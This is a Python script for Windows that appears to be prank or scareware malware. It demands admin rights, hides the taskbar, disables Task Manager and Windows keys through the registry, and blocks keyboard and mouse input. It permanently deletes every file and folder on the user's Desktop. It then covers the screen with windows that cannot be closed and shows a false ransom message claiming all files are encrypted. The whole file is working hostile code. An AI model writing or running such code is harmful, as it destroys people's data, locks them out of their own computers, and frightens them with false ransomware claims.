import ctypes
import os
import sys
import threading
import time
import tkinter as tk
from tkinter import messagebox
from PIL import Image, ImageTk
import winreg
import win32gui
import win32con
import shutil
from pynput import keyboard, mouse
import pygame
import subprocess
import random

# -------------------- Fonctions utilitaires --------------------
def hide_console():
    whnd = ctypes.windll.kernel32.GetConsoleWindow()
    if whnd != 0:
        ctypes.windll.user32.ShowWindow(whnd, 0)

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def show_message(title, message, borderless=False):
    root = tk.Tk()
    if borderless:
        root.overrideredirect(True)
        root.attributes("-topmost", True)
        screen_width = root.winfo_screenwidth()
        screen_height = root.winfo_screenheight()
        window_width, window_height = 200, 100
        x = (screen_width - window_width) // 2
        y = (screen_height - window_height) // 2
        root.geometry(f"{window_width}x{window_height}+{x}+{y}")
        label = tk.Label(root, text=message, font=("Arial", 14))
        label.pack(expand=True)
    else:
        root.withdraw()
        messagebox.showwarning(title, message)
    return root

def hide_taskbar():
    try:
        hwnd = win32gui.FindWindow("Shell_TrayWnd", None)
        if hwnd:
            win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "NoWinKeys", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
    except Exception as e:
        print(f"Erreur hide_taskbar : {e}")

def disable_task_manager():
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        except FileNotFoundError:
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
        win32gui.SendMessageTimeout(
            win32con.HWND_BROADCAST,
            win32con.WM_SETTINGCHANGE,
            0,
            0,
            win32con.SMTO_ABORTIFHUNG,
            5000
        )
    except Exception as e:
        print(f"Erreur disable_task_manager : {e}")

def set_wallpaper(image_path):
    try:
        full_path = os.path.abspath(image_path)
        if os.path.exists(full_path):
            ctypes.windll.user32.SystemParametersInfoW(20, 0, full_path, 3)
    except Exception as e:
        print(f"Erreur set_wallpaper : {e}")

def clear_desktop_icons():
    try:
        desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
        for item in os.listdir(desktop_path):
            item_path = os.path.join(desktop_path, item)
            try:
                if os.path.isfile(item_path):
                    os.remove(item_path)
                elif os.path.isdir(item_path):
                    shutil.rmtree(item_path)
            except Exception as e:
                print(f"Erreur clear_desktop_icons : {e}")
    except Exception as e:
        print(f"Erreur clear_desktop_icons global : {e}")

def fermer_apres_delay(nom_programme, delay=15):
    time.sleep(delay)
    subprocess.run(["taskkill", "/f", "/im", nom_programme])

# -------------------- Fonctions visuelles --------------------
def trippy_screen():
    root = tk.Tk()
    root.attributes("-fullscreen", True)
    root.configure(bg="black")
    root.protocol("WM_DELETE_WINDOW", lambda: None)

    width, height = root.winfo_screenwidth(), root.winfo_screenheight()
    canvas = tk.Canvas(root, width=width, height=height)
    canvas.pack()
    canvas.create_rectangle(0, 0, width, height, fill="gray", stipple="gray50")

    colors = ["red", "blue", "green", "yellow", "purple", "orange"]
    carre_size = 200

    def draw_squares():
        x, y = random.randint(0, width - carre_size), random.randint(0, height - carre_size)
        color = random.choice(colors)
        canvas.create_rectangle(x, y, x + carre_size, y + carre_size, fill=color, outline="")
        root.after(2000, draw_squares)

    draw_squares()
    root.mainloop()

def slideshow_images():
    root = tk.Tk()
    root.overrideredirect(True)
    root.attributes("-topmost", True)
    screen_width, screen_height = root.winfo_screenwidth(), root.winfo_screenheight()
    root.geometry(f"{screen_width}x{screen_height}+0+0")

    images = []
    for i in range(1, 6):
        path = f"skibidi{i}.jpeg"
        if os.path.exists(path):
            img = Image.open(path).resize((screen_width, screen_height), Image.ANTIALIAS)
            images.append(ImageTk.PhotoImage(img))

    label = tk.Label(root)
    label.pack()

    def update(idx=0):
        label.config(image=images[idx])
        root.after(2000, lambda: update((idx + 1) % len(images)))

    if images:
        update()
        root.mainloop()

def show_final_window(main_text="Votre ordinateur est vérouillé !", description="Tous vos fichiers ont étés encryptés."):
    root = tk.Tk()
    root.overrideredirect(True)
    root.attributes("-topmost", True)
    root.configure(bg="red")

    screen_width, screen_height = root.winfo_screenwidth(), root.winfo_screenheight()
    window_width, window_height = 600, 300
    x, y = (screen_width - window_width) // 2, (screen_height - window_height) // 2
    root.geometry(f"{window_width}x{window_height}+{x}+{y}")

    tk.Label(root, text=main_text, font=("Arial", 48, "bold"), fg="black", bg="red").pack(pady=(40, 10))
    tk.Label(root, text=description, font=("Arial", 20), fg="black", bg="red").pack()

    root.protocol("WM_DELETE_WINDOW", lambda: None)
    root.mainloop()

def boucle_erreurs_gui():
    root = tk.Tk()
    root.title("bztp la grosse slp ! ya une skibidi erreur ❤️")
    root.geometry("600x400")
    text_box = tk.Text(root, bg="black", fg="red", font=("Consolas", 12))
    text_box.pack(expand=True, fill=tk.BOTH)

    def spam_errors():
        while True:
            try:
                1 / 0
            except Exception:
                text_box.insert(tk.END, "Salamalékoum rouya menge ma paffette ! 😇\n")
                text_box.see(tk.END)
            time.sleep(0.1)

    threading.Thread(target=spam_errors, daemon=True).start()
    root.mainloop()

def play_music_loop():
    pygame.mixer.init()
    pygame.mixer.music.load("music.mp3")
    pygame.mixer.music.set_volume(1.0)
    pygame.mixer.music.play(-1)
    while True:
        pygame.time.Clock().tick(10)

# -------------------- Fonctions de verrouillage --------------------
def block_input():
    ctypes.windll.user32.BlockInput(True)

def keyboard_hook():
    pressed_keys = set()
    def on_press(key):
        try:
            pressed_keys.add(key)
            if key == keyboard.Key.f4 and (keyboard.Key.alt in pressed_keys or keyboard.Key.alt_l in pressed_keys or keyboard.Key.alt_r in pressed_keys):
                return False
            if key == keyboard.Key.esc and (keyboard.Key.ctrl in pressed_keys or keyboard.Key.ctrl_l in pressed_keys or keyboard.Key.ctrl_r in pressed_keys):
                return False
        except: pass
        return True
    def on_release(key):
        pressed_keys.discard(key)
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    return listener

# -------------------- Main --------------------
def main():
    hide_console()

    if not is_admin():
        show_message("Erreur", "Exécute en mode admin, sinon c’est mort.", borderless=False)
        sys.exit(1)

    loading_window = show_message("Chargement", "Loading...", borderless=True)

    listener = keyboard_hook()
    hide_taskbar()
    
    threading.Thread(target=play_music_loop, daemon=True).start()

    set_wallpaper("wallpaper.jpeg")
    block_input()
    clear_desktop_icons()

    threading.Thread(target=trippy_screen, daemon=True).start()
    threading.Thread(target=slideshow_images, daemon=True).start()
    threading.Thread(target=boucle_erreurs_gui, daemon=True).start()

    loading_window.destroy()
    show_final_window()

if __name__ == "__main__":
    main()
